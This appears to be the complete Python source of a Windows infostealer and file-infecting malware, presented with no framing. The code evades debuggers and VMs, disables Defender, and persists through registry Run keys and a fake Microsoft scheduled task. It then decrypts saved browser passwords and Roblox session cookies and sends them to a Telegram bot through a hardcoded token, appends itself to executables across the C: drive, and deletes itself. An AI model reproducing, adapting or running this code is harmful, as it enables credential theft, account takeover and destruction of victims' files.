import os, shutil, winreg, time, requests, sqlite3, json, base64, sys, ctypes, random, string, subprocess
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

token = "8643306293:AAGgmAp5SGFtAFVA99pDAk04xmLKIF1-hZg"
chat_id = "5063736514"

def send(text):
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": text[:4000]}, timeout=3)
    except: pass

if sys.gettrace() is not None: sys.exit(0)
if os.path.exists("C:\\Program Files\\VMware\\") or os.path.exists("C:\\Program Files\\Oracle\\VirtualBox"): sys.exit(0)

ctypes.windll.kernel32.SetConsoleTitleW("Microsoft Windows Update Service")
rand_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.exe'
d = os.environ['WINDIR'] + '\\System32\\' + rand_name
p = sys.argv[0]
if not os.path.exists(d):
    shutil.copy2(p, d)
    os.system(f'attrib +h +s +r "{d}"')
    try: subprocess.run(f'powershell -command "Add-MpPreference -ExclusionPath \"{d}\""', shell=True, capture_output=True)
    except: pass

for reg_path in [r"Software\Microsoft\Windows\CurrentVersion\Run", r"Software\Microsoft\Windows\CurrentVersion\RunOnce"]:
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "SystemUpdater", 0, winreg.REG_SZ, d)
        winreg.CloseKey(k)
    except: pass
os.system(f'schtasks /create /tn "MicrosoftEdgeUpdateTask{random.randint(100,999)}" /tr "{d}" /sc onlogon /delay 00{random.randint(30,180):03d}000 /f')

time.sleep(random.randint(1800, 3600))
user32 = ctypes.windll.user32
last = user32.GetLastInputInfo()
while True:
    if user32.GetLastInputInfo() - last > 600000: break
    time.sleep(120)

def dec(s):
    return ''.join(chr(ord(c) ^ 0x55) for c in base64.b64decode(s).decode())

try: subprocess.run('powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
except: pass

def decrypt_pwd(enc, key):
    try: return AESGCM(key).decrypt(enc[3:], enc[:12], None).decode()
    except: return "ERROR"

local_state = os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Local State'
key = None
if os.path.exists(local_state):
    with open(local_state, 'r') as f:
        key = base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:]

browsers = {
    'Chrome': os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default',
    'Edge': os.environ['LOCALAPPDATA'] + '\\Microsoft\\Edge\\User Data\\Default',
    'Brave': os.environ['LOCALAPPDATA'] + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Opera': os.environ['APPDATA'] + '\\Opera Software\\Opera Stable'
}

for name, path in browsers.items():
    db_path = path + '\\Login Data'
    if os.path.exists(db_path) and key:
        tmp = os.environ['TEMP'] + f'\\{random.randint(1000,9999)}.db'
        shutil.copy2(db_path, tmp)
        conn = sqlite3.connect(tmp)
        for url, user, enc in conn.execute('SELECT origin_url, username_value, password_value FROM logins'):
            if user and enc:
                pwd = decrypt_pwd(enc, key)
                send(f"[{name}] {url} | {user} | {pwd}")
        conn.close()
        os.remove(tmp)

for name, path in browsers.items():
    cookies_path = path + '\\Cookies'
    if os.path.exists(cookies_path) and key:
        tmp = os.environ['TEMP'] + f'\\{random.randint(1000,9999)}.db'
        shutil.copy2(cookies_path, tmp)
        conn = sqlite3.connect(tmp)
        for host, name_c, enc in conn.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%'"):
            try:
                dec_cookie = decrypt_pwd(enc, key)
                if dec_cookie and 'ROBLOSECURITY' in name_c:
                    send(f"ROBLOX COOKIE: {dec_cookie}")
            except: pass
        conn.close()
        os.remove(tmp)
for root, dirs, files in os.walk('C:\\'):
    for f in files:
        if f.endswith('.exe') and f != os.path.basename(p) and os.path.getsize(os.path.join(root, f)) < 50*1024*1024:
            try:
                with open(os.path.join(root, f), 'ab') as t, open(p, 'rb') as s:
                    t.write(s.read())
            except: pass

try:
    os.system(f'taskkill /f /im {rand_name}')
    os.remove(p)
    with open(os.environ['TEMP'] + '\\del.bat', 'w') as f:
        f.write(f'@echo off\ntimeout 2\ndel "{p}"\ndel "%~f0"')
    subprocess.Popen(os.environ['TEMP'] + '\\del.bat', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass